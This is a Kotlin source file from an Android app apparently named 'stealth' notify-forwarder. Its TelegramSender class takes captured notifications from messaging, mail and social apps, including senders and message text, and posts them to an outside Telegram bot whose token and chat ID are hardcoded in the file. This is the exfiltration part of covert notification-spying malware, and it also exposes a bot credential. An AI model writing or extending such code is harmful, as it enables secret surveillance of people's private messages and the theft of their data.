package com.stealth.notifyforwarder.network

import android.content.Context
import android.util.Log
import com.google.gson.Gson
import com.stealth.notifyforwarder.data.NotificationEntity
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.TimeUnit

/**
 * Handles sending notifications to Telegram
 * Uses the Telegram Bot API to forward captured notifications
 */
class TelegramSender(private val context: Context) {

    private val client: OkHttpClient = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .build()

    private val gson = Gson()

    // Telegram Bot Token (hardcoded from user input)
    private val botToken = "8412276799:AAFhPZmYJzr9OpxZlqNgEZKNQ6Ft10E1650"

    // Telegram Chat ID (hardcoded from user input)
    private val chatId = "8002384032"

    private val baseUrl = "https://api.telegram.org/bot$botToken"

    /**
     * Sends a notification to Telegram
     */
    suspend fun sendNotification(notification: NotificationEntity): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                val message = formatMessage(notification)
                val success = sendMessage(message)
                if (success) {
                    Log.d(TAG, "Notification sent successfully: ${notification.packageName}")
                }
                success
            } catch (e: Exception) {
                Log.e(TAG, "Error sending notification", e)
                false
            }
        }
    }

    /**
     * Sends a text message to Telegram
     */
    suspend fun sendMessage(message: String): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                val json = gson.toJson(
                    mapOf(
                        "chat_id" to chatId,
                        "text" to message,
                        "parse_mode" to "HTML"
                    )
                )

                val requestBody = json.toRequestBody("application/json".toMediaType())

                val request = Request.Builder()
                    .url("$baseUrl/sendMessage")
                    .post(requestBody)
                    .build()

                client.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        val responseBody = response.body?.string()
                        Log.d(TAG, "Telegram response: $responseBody")
                        true
                    } else {
                        Log.e(TAG, "Telegram error: ${response.code} - ${response.message}")
                        false
                    }
                }
            } catch (e: IOException) {
                Log.e(TAG, "Network error sending to Telegram", e)
                false
            } catch (e: Exception) {
                Log.e(TAG, "Error sending message to Telegram", e)
                false
            }
        }
    }

    /**
     * Formats the notification for Telegram
     * Uses HTML formatting for better presentation
     */
    private fun formatMessage(notification: NotificationEntity): String {
        val dateFormat = SimpleDateFormat("dd.MM.yyyy HH:mm", Locale.getDefault())
        val formattedDate = dateFormat.format(Date(notification.timestamp))

        // Get category icon based on app
        val categoryIcon = getCategoryIcon(notification.packageName)

        return buildString {
            appendLine("${categoryIcon} <b>Yeni Bildirim</b>")
            appendLine("────────────────────")
            appendLine("<b>📦 Uygulama:</b> ${notification.appName}")
            if (notification.title.isNotBlank()) {
                appendLine("<b>👤 Gönderen:</b> ${notification.title}")
            }
            if (notification.message.isNotBlank()) {
                val truncatedMessage = if (notification.message.length > 500) {
                    notification.message.take(500) + "..."
                } else {
                    notification.message
                }
                appendLine("<b>💬 Mesaj:</b>")
                appendLine("<code>$truncatedMessage</code>")
            }
            if (notification.subText.isNotBlank()) {
                appendLine("<b>📝 Alt Metin:</b> ${notification.subText}")
            }
            appendLine("────────────────────")
            appendLine("<b>⏰ Zaman:</b> $formattedDate")
        }
    }

    /**
     * Gets category icon based on package name
     */
    private fun getCategoryIcon(packageName: String): String {
        return when {
            packageName.contains("whatsapp", ignoreCase = true) -> "💬"
            packageName.contains("facebook", ignoreCase = true) -> "👤"
            packageName.contains("instagram", ignoreCase = true) -> "📸"
            packageName.contains("messenger", ignoreCase = true) -> "💬"
            packageName.contains("telegram", ignoreCase = true) -> "✈️"
            packageName.contains("twitter", ignoreCase = true) || packageName.contains("x", ignoreCase = true) -> "🐦"
            packageName.contains("mail", ignoreCase = true) || packageName.contains("gmail", ignoreCase = true) -> "📧"
            packageName.contains("sms", ignoreCase = true) || packageName.contains("messages", ignoreCase = true) -> "📱"
            packageName.contains("discord", ignoreCase = true) -> "🎮"
            packageName.contains("tiktok", ignoreCase = true) -> "🎵"
            packageName.contains("snapchat", ignoreCase = true) -> "👻"
            packageName.contains("linkedin", ignoreCase = true) -> "💼"
            packageName.contains("youtube", ignoreCase = true) -> "▶️"
            packageName.contains("netflix", ignoreCase = true) -> "🎬"
            packageName.contains("spotify", ignoreCase = true) -> "🎵"
            else -> "🔔"
        }
    }

    /**
     * Sends a test message to verify connection
     */
    suspend fun sendTestMessage(): Boolean {
        val testMessage = buildString {
            appendLine("✅ <b>Bağlantı Testi Başarılı</b>")
            appendLine("────────────────────")
            appendLine("Uygulama düzgün çalışıyor.")
            appendLine("Bildirimler Telegram'a aktarılmaya hazır.")
        }

        return sendMessage(testMessage)
    }

    companion object {
        private const val TAG = "TelegramSender"
    }
}
